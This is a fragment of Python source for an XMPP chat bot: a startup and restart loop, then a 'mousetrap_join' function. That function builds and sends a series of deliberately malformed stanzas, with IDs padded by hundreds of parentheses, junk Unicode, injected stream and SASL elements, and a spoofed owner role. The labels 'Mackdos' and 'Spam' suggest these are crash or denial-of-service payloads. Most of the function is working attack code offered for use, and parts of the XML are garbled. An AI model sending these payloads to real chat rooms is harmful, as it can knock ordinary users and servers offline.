	JCON.UnregisterDisconnectHandler(JCON.DisconnectHandler)
	JCON.sendInitPresence()

	if check_file(file='conferences.dll'):
		groupchats = eval(read_file(GROUPCHAT_CACHE_FILE))
		Print('\n ## EnTeRinG %s Conferences' % str(len(groupchats)), color5)
		for groupchat in groupchats:
			get_gch_cfg(groupchat)
			MACROS.init(groupchat)
			for process in STAGE1_INIT:
				with smph:
					INFO['thr'] += 1
					threading.Thread(None,process,'stage1_init'+str(INFO['thr']),(groupchat,)).start()
			write_file('tools/back/'+groupchat+'/config.cfg', str(GCHCFGS[groupchat]))
			with smph:
				INFO['thr'] += 1
				threading.Thread(None,join_groupchat,'gch'+str(INFO['thr']),(groupchat,groupchats[groupchat]['nick'] if groupchats[groupchat]['nick'] else BotNick)).start()
	Print('\n # OK, Online AnD ReaDy', color1)
	INFO['start'] = time.time()
	upkeep()
	for process in STAGE2_INIT:
		with smph:
			INFO['thr'] += 1
			threading.Thread(None,process,'stage2_init'+str(INFO['thr'])).start()
			
	while 1:
		JCON.Process(10)

if __name__ == "__main__":
	try:
		start()
	except KeyboardInterrupt:
		Print('\n Shutdown!', color2)
		prs=xmpp.Presence(typ='unavailable')
		prs.setStatus(u'Shutdown!')
		JCON.send(prs)
		time.sleep(0)
		Print('\n - disconnected!', color2)
		Print('\n - Shutdown!', color2)
		sys.exit(0)
	except:
		if AUTO_RESTART:
			traceback.print_exc()
			try:
				JCON.disconnected()
			except IOError:
				pass
			try:
				GenCon = ConfigParser.ConfigParser()
				GenCon.read(GFILE)
				MaxMemory = int(GenCon.get("SLAEFR", "MEMORY"))*1024
			except:
				pass
				MaxMemory = (32768 if (MaxMemory and MaxMemory <= 32768) else MaxMemory)
			try:
				time.sleep(0)
			except KeyboardInterrupt:
				Print('\n Shutdown!', color2)
				prs=xmpp.Presence(typ='unavailable')
				prs.setStatus(u' Shutdown!')
				JCON.send(prs)
				time.sleep(0)
				Print('DISCONNECTED', color2)
				Print('\nSToPpeD\n', color2)
				sys.exit(0)
				Print('Waiting for Reboot', color3)
			Print('rebooting', color3)
			os.execl(sys.executable, sys.executable, sys.argv[0])
		else:
			raise
		
def mousetrap_join(cl,groupchat,nick):
        add=['|','_','/','.','0']
        botnick = generate_mousetrap(random.Random().randint(7,1100))
        if MOUSE_NICK:
                botnick=random.choice(MOUSE_NICK)
        CAPS = 'http://www.syriatalk.org/caps'
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%"><priority>%PRIORETET%</priority><x xmlns="http://jabber.org/protocol/muc" /><c xmlns="http://jabber.org/protocol/caps" node="%CAPS%" ver="" /><show>%SHOW%</show><x xmlns="http://qip.ru/x-status" id="100"><title></title></x><status>hgfhhfmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</status></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="getros">%PRIORETET%<jוNcרg xmlns="jabber:iq:roster"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq  type="result" xml:lang="en" to="%TO_ROOM%/%NICK%" id="Mackdos.alrb">%PRIORETET%<Mackdos.alrb xmlns="http ://jabber.org/protocol/profile"> <stream:stream xmlns:stream="http ://etherx.jabber.org/streams" version="1.3.6" xml:lang="en" to="${param.full}"/> <success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams" type="error" to="${param.full}" id="Mackdos.alrb"><auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/></stream:stream> </Mackdos.alrb></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to=%TO_ROOM%/%NICK%"" type="get" id="_arab_1498>>>>>>>>>>[)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))>>>70http://arab5123902"><ping xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%" id="request_2308">%PRIORETET%<status></status><priority>0</priority><stream:stream xmlns="d"><x xmlns="vcard-temp:x:update"><photo/></x><c xmlns="http://jabber.org/protocol/caps" node="" ver="=" hash=""/><x xmlns="http://jabber.org/protocol/muc#user"><itemjid="%TO_ROOM%/%NICK%" affiliation="owner" role="moderator"/></x></stream:stream></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="A((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((A"><query xmlns="jabber:iq:version"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="result" id="XmlnsTenDaxmlns">%PRIORETET%<x xmlns="http://jabber.org/protocol/profile"><stream:stream/><stream:stream/><stream:stream/><stream:stream/><success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"/></x></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id=A((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((A"><query xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id=A)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))A><query xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="Spam)))))))))))))))))">%PRIORETET%<ping xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" xml="ar" id="2525999" type="get">%PRIORETET%<session xmlns="http://www.google.com/session" id="99954676655" type="initiate" initiator=""/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<message to="%TO_ROOM%/%NICK%" type="tenda">%PRIORETET%<error code="">%PRIORETET%</error></message>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq id="A█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;LA" type="get" to="%TO_ROOM%/%NICK%"><query xmlns="http://jabber.org/protocol/disco#info" node="http://jabber.org/protocol/rosterx"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')                               
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" id="A█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;LA" type="get"><query xmlns="jabber:iq:version"><name>home</name><version>123456</version><os>pc version</os></query></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        node=xmpp.simplexml.XML2Node(unicode(NODE_).encode('utf8'))

        prs = xmpp.protocol.Presence(groupchat+'/'+botnick)
        prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
        try:
                cl.send(node)
        except:
                pass
        threading.Thread(None, mousetrap_query, 'mousetrap_query'+str(random.randrange(0, 999)), (cl,groupchat,nick,)).start()
        	
